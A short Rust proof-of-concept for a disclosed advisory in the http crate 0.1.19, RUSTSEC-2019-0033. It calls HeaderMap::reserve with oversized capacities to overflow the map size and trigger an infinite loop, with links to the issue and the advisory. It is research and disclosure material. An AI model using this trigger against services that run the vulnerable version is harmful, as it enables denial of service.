/*!
```rudra-poc
[target]
crate = "http"
version = "0.1.19"

[test]
analyzers = ["manual"]

[report]
issue_url = "https://github.com/hyperium/http/issues/352"
issue_date = 2019-11-16
rustsec_url = "https://github.com/RustSec/advisory-db/pull/217"
rustsec_id = "RUSTSEC-2019-0033"
```
!*/
#![forbid(unsafe_code)]

use http::header::{HeaderMap, HOST};

fn main() {
    let mut map = HeaderMap::<u32>::with_capacity(32);
    dbg!(map.capacity());
    // map size becomes larger than MAX_SIZE
    map.reserve(50000);
    dbg!(map.capacity());
    // debug mode: panics with integer overflow
    // release mode: the map size silently overflows to 0
    map.reserve(std::usize::MAX - 100000);

    map.insert("host", 42);
    // this calls grow(0), which causes infinite loop
    map.reserve(std::usize::MAX - 100000);
}
